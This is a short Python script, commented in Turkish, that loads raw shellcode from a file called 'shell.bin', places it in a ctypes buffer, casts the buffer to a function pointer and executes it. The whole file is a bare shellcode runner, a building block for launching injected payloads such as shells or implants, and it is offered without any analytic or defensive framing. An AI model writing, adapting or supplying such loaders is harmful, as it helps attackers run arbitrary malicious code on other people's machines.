import ctypes
import os

# Betiğin bulunduğu dizini al
script_dir = os.path.dirname(os.path.abspath(__file__))

# shell.bin dosyasının tam yolunu oluştur
shellcode_path = os.path.join(script_dir, "shell.bin")

# shell.bin dosyasını oku ve binary veriyi al
with open(shellcode_path, "rb") as f:
    shellcode = f.read()

# Shellcode'u çalıştırmak için bir buffer oluştur
shellcode_buffer = ctypes.create_string_buffer(shellcode)

# Shellcode'un bellekte yürütülmesi için bir işaretçi ayarla
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(None))

# Shellcode'u çalıştır
shellcode_func()
